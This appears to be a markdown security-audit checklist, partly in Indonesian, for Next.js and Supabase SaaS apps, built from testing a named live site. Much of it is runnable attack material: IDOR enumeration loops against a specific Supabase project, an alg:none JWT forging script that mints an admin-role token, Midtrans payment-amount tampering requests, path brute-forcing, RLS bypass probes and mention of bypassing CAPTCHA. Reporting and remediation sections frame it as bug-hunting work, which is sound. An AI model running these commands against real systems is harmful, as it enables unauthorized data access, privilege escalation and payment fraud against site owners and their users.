# Next.js + Supabase SaaS Security Audit Checklist

Session-specific checklist untuk audit modern SaaS apps (Next.js 13+ App Router + Supabase backend). Template hasil dari testing gevixa.my.id.

## Core Observations

### Architecture Pattern
- **Frontend:** Next.js App Router (server components + client components)
- **Backend:** Supabase Auth + PostgreSQL with RLS (Row Level Security)
- **Payment:** Midtrans Snap API (Sandbox mode detected)
- **WAF:** Cloudflare Turnstile (CAPTCHA), Cloudflare Proxy
- **Deployment:** Vercel/Cloudflare Pages pattern (immutable build artifacts)

### Authentication Flow
```
User Visit → /login (SPA redirect if not authed) → 
Google OAuth OR Email Signup → Supabase Auth → JWT stored in cookies → 
Protected routes enforce `useAuth()` hook → RLS blocks unauthenticated DB access
```

## Recon Phase (Public Attack Surface)

### ✅ What to Check WITHOUT credentials:
1. **Tech fingerprint** → `curl -sI <url>` check X-Powered-By, Server headers
2. **JS bundle secrets** → Scan `_next/static/chunks/*.js` for API keys, tokens
3. **CSP analysis** → `Content-Security-Policy` header shows allowed domains
4. **CORS configuration** → `Access-Control-Allow-Origin: *` is DANGEROUS but often mitigated by auth
5. **Exposed paths** → Test `/admin`, `/api/*`, `/graphql`, `/auth/*`, `/rest/v1/*`
6. **Backup files** → `.git/config`, `.env`, `backup.sql`, `wp-config.php`
7. **Well-known endpoints** → `.well-known/security.txt`, `robots.txt`, `sitemap.xml`
8. **Developer endpoints** → `_next/webpack-hmr`, `__nextjs_original-stack-frame`, `debug`

### ❌ What Usually BLOCKED Without Auth:
- `/api/auth/signup` → 405 Method Not Allowed (Next.js SPA enforcement)
- `/api/payment/*` → 404 or requires session
- Supabase REST API → 401 Unauthorized Invalid API Key
- GraphQL introspection → Blocked by CSP origins
- Password reset endpoints → User enumeration protection

## Authenticated Testing Priority

### After getting test account (bypass CAPTCHA):

#### 1. **IDOR Testing** (Highest ROI)
```bash
# Get authenticated session cookie/token
curl -H "Authorization: Bearer <JWT>" https://gevixa.my.id/rest/v1/users/<user_id>

# Test sequential IDOR
for id in 1 2 3 4 5; do
  curl -H "Authorization: Bearer $TOKEN" "https://uyrfwzawkchzzgsrrbwn.supabase.co/rest/v1/orders?order_id=eq.$id&select=*" -o /dev/null -w "%{http_code} %s\n"
done
```

**Focus areas:**
- User profiles (`/api/users/:id`)
- Orders/invoices (`/api/orders/:orderId`)
- Outlets (`/api/outlets/:outletId`)
- Menu items (`/api/menu/:menuId`)
- Payment transactions (`/api/payments/:paymentId`)

#### 2. **Business Logic Flaws**
- **Checkout flow** → Can I manipulate price in request body before Midtrans redirect?
- **Coupon/reward logic** → Rate limiting bypass? Reuse unlimited discounts?
- **Inventory sync** → Race condition on stock deduction during high traffic?
- **Admin override** → Can normal user escalate role via mass assignment?
- **Webhook signature** → Can I spoof Midtrans callback with arbitrary success status?

#### 3. **JWT Vulnerabilities**
```bash
# Decode current token
echo "<jwt_token>" | cut -d. -f2 | base64 -d

# Check claims
{
  "sub": "uuid",
  "role": "owner|user|staff",
  "user_id": "uuid",
  "email": "user@example.com",
  "org_id": "uuid"
}

# Test alg:none bypass (if server accepts unsigned tokens)
python3 << 'EOF'
import base64, json
def b64url(d): return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin_uuid", "role": "admin"}
print(f"{b64url(header)}.{b64url(payload)}.")
EOF
```

#### 4. **Supabase RLS Bypass**
RLS rules should block all anonymous queries. Verify:
- `/rest/v1` endpoint returns data without valid JWT → CRITICAL
- CORS allows `*` origin AND no session required → HIGH
- Service role key leaked in JS bundles → CRITICAL

#### 5. **Payment Manipulation**
After creating order:
```bash
# Intercept checkout payload
curl -X POST "https://app.sandbox.midtrans.com/snap/v1/transactions" \
  -H "Authorization: Basic YOUR_SERVER_KEY" \
  -H "Content-Type: application/json" \
  -d '{"transaction_details":{"order_id":"ORDER-123","amount":1},"item_details":[{"id":"ITEM-A","price":99,"quantity":1}]}'

# Can you modify:
- amount from 100000 to 1?
- order_id to someone else's order?
- item details to free items?
- webhook callback URL to attacker domain?
```

## Common Next.js SPA Pitfalls

### False Positive Traps
- **All non-existent paths return 404 HTML** → Don't confuse SPA routing errors with real missing endpoints
- **Redirect loops** → `/login?redirect=/dashboard` might redirect back to login → Use browser devtools Network tab to inspect actual requests
- **CORS warnings** → `Access-Control-Allow-Origin: *` doesn't mean exploit → Still need valid JWT for Supabase queries
- **405 Method Not Allowed** → Often means endpoint exists but method blocked (e.g., GET allowed but POST requires auth)

### Real Endpoints Discovery
Check these patterns:
1. `_next/static/chunks/app/dashboard/page.js` → Client-side component code reveals API calls
2. Browser DevTools Network tab → Watch actual `fetch`/`axios` calls after login
3. Source maps → If present, reveals full frontend architecture
4. `manifest.json`, `service-worker.js` → Service worker registration paths

## Security Headers Assessment

Target should have:
```
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' <allowed-domains>; style-src 'self' 'unsafe-inline'; ...
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=(self), payment=(), usb=()
```

### Red Flags Found in Wild
- `CORS: *` → Theoretical risk if combined with weak JWT validation
- CSP allows `'unsafe-inline'` → XSS potential if input sanitization weak
- Missing `frame-ancestors 'none'` → Clickjacking possible on forms

## Reporting Format

When reporting vulnerabilities:

```markdown
# Title: [SEVERITY] Bug Type in Endpoint

Target: https://gevixa.my.id
Severity: Critical/High/Medium/Low
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N

## Summary
[One sentence business impact]

## Steps to Reproduce
1. Register test account (bypass CAPTCHA via...)
2. Login and extract JWT token
3. Make this modified request: `curl -X POST ...`
4. Observe response: `{...}`

## Proof of Concept
[Video link or terminal transcript showing successful exploitation]

## Impact
[Data exfiltration count, financial loss, account takeover scope]

## Remediation
1. Implement ownership verification at database level (RLS policy)
2. Add rate limiting to sensitive endpoints
3. Validate all client-supplied prices against database values
4. Sign webhooks with HMAC-SHA256 using server-secret
```

## Quick Command Reference

```bash
# SPA-safe path brute force (status codes only)
for p in admin graphql api/v1 rest/v1/auth/forgot-password; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -L -A "Mozilla/5.0" "https://target.com/$p")
  [ "$code" != "404" ] && echo "$code $p"
done

# Extract Supabase project ID from HTML
curl -s "https://target.com/login" | grep -oE '[a-z0-9]{26}\.supabase\.co'

# JWT decode
echo "<token>" | cut -d. -f2 | base64 -d 2>/dev/null || echo "(padding needed)"

# Test RLS bypass
curl -X GET "https://project-id.supabase.co/rest/v1/users" \
  -H "apikey: ANON_KEY" \
  -D- -o /dev/null | grep -E "401|403|error"

# Midtrans webhook testing (requires server key from authenticated session)
curl -X POST "https://app.sandbox.midtrans.com/snap/v1/transactions/{orderId}/status" \
  -H "Authorization: Basic YOUR_SERVER_KEY" \
  -d '{"status":"capture","transaction_time":"2024-01-01 12:00:00 +0700"}'
```

---

Last updated: Aug 29, 2026
Test case: gevixa.my.id (Next.js + Supabase + Midtrans stack)
Status: Public surface CLEAN, needs authenticated account for meaningful testing